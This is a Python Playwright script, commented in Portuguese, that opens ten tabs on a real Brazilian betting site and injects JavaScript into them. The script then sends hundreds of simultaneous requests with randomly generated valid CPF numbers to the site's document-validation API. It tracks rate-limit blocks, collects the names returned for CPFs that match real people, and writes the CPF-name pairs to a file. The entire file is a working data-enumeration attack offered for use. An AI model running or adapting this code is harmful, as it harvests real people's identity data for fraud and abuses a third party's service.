#!/usr/bin/env python3
"""
Injetor BLAST V2 - Espera todas completarem
"""
import random
import time
from playwright.sync_api import sync_playwright

NUM_TABS = 10
REQUESTS_PER_TAB = 50

def gerar_cpfs(n):
    cpfs = []
    for _ in range(n):
        cpf = [random.randint(0, 9) for _ in range(9)]
        soma = sum((10 - i) * cpf[i] for i in range(9))
        resto = soma % 11
        cpf.append(0 if resto < 2 else 11 - resto)
        soma = sum((11 - i) * cpf[i] for i in range(10))
        resto = soma % 11
        cpf.append(0 if resto < 2 else 11 - resto)
        cpfs.append(''.join(map(str, cpf)))
    return cpfs

def main():
    total = NUM_TABS * REQUESTS_PER_TAB
    
    print("="*65)
    print(f"💥 BLAST V2 - {total} REQUISIÇÕES SIMULTÂNEAS")
    print("="*65)
    
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=False)
        context = browser.new_context()
        
        # FASE 1: Abrir tabs
        print(f"\n🌐 Abrindo {NUM_TABS} tabs...")
        pages = []
        for i in range(NUM_TABS):
            page = context.new_page()
            page.goto("https://7k.bet.br/", wait_until="domcontentloaded", timeout=30000)
            pages.append(page)
            print(f"   Tab {i+1}/{NUM_TABS} ✅")
        
        print(f"\n⏳ Estabilizando (5s)...")
        time.sleep(5)
        
        # FASE 2: Injetar JS
        print(f"\n💉 Injetando código...")
        for i, page in enumerate(pages):
            page.evaluate("""() => {
                window.stats = {ok: 0, validos: [], blocked: 0, erro: 0, done: false};
                
                window.validarCPF = async (cpf) => {
                    try {
                        const r = await fetch('/api/documents/validate', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({number: cpf, type: 'cpf'})
                        });
                        if (r.status === 200) {
                            const data = await r.json();
                            window.stats.ok++;
                            window.stats.validos.push({cpf, nome: data.data?.name || 'N/A'});
                        } else if (r.status === 400) {
                            window.stats.ok++;
                        } else if (r.status === 403) {
                            window.stats.blocked++;
                        } else {
                            window.stats.erro++;
                        }
                    } catch (e) {
                        window.stats.erro++;
                    }
                };
                
                window.blast = async (cpfs) => {
                    await Promise.all(cpfs.map(cpf => window.validarCPF(cpf)));
                    window.stats.done = true;
                    return window.stats;
                };
            }""")
        print(f"   ✅ Todas injetadas")
        
        # FASE 3: Gerar CPFs
        print(f"\n📝 Gerando {total} CPFs...")
        all_cpfs = [gerar_cpfs(REQUESTS_PER_TAB) for _ in range(NUM_TABS)]
        
        # FASE 4: BLAST
        print(f"\n💥 DISPARANDO...")
        print(f"   3... 2... 1... 🚀 BLAST!")
        
        inicio = time.time()
        
        # Dispara todas sem esperar
        for i, page in enumerate(pages):
            page.evaluate("cpfs => window.blast(cpfs)", all_cpfs[i])
        
        # Espera até todas terminarem (polling)
        print(f"\n⏳ Aguardando conclusão...")
        while True:
            all_done = True
            status = []
            for i, page in enumerate(pages):
                try:
                    done = page.evaluate("() => window.stats.done")
                    ok = page.evaluate("() => window.stats.ok")
                    status.append(f"T{i+1}:{ok}")
                    if not done:
                        all_done = False
                except:
                    status.append(f"T{i+1}:?")
            
            elapsed = time.time() - inicio
            print(f"\r   [{elapsed:.1f}s] {' '.join(status)}", end="", flush=True)
            
            if all_done:
                break
            time.sleep(1)
        
        tempo = time.time() - inicio
        print(f"\n   ✅ Todas completaram em {tempo:.1f}s")
        
        # Coleta resultados
        total_ok = 0
        total_blocked = 0
        all_validos = []
        
        for i, page in enumerate(pages):
            try:
                stats = page.evaluate("() => window.stats")
                total_ok += stats["ok"]
                total_blocked += stats["blocked"]
                all_validos.extend(stats["validos"])
            except:
                pass
        
        print("\n" + "="*65)
        print("📊 RELATÓRIO FINAL")
        print("="*65)
        print(f"   Tabs: {NUM_TABS}")
        print(f"   Requisições por tab: {REQUESTS_PER_TAB}")
        print(f"   Total: {total}")
        print(f"   Tempo: {tempo:.1f}s")
        print(f"\n   ⚡ VELOCIDADE: {total/tempo:.1f} req/s")
        print(f"\n   ✅ OK: {total_ok}")
        print(f"   🎯 Válidos: {len(all_validos)}")
        print(f"   🚫 Blocked: {total_blocked}")
        
        if all_validos:
            print(f"\n🎯 CPFs VÁLIDOS ({len(all_validos)}):")
            for v in all_validos[:30]:
                cpf = v['cpf']
                print(f"   {cpf[:3]}.{cpf[3:6]}.{cpf[6:9]}-{cpf[9:]} | {v['nome']}")
            
            with open("cpfs_blast.txt", "w", encoding="utf-8") as f:
                for v in all_validos:
                    cpf = v['cpf']
                    f.write(f"{cpf[:3]}.{cpf[3:6]}.{cpf[6:9]}-{cpf[9:]} | {v['nome']}\n")
            print(f"\n💾 Salvos em cpfs_blast.txt")
        
        browser.close()
        
        print("\n" + "="*65)
        print(f"✅ BLAST: {total/tempo:.1f} req/s | {len(all_validos)} CPFs válidos")
        print("="*65)

if __name__ == "__main__":
    main()







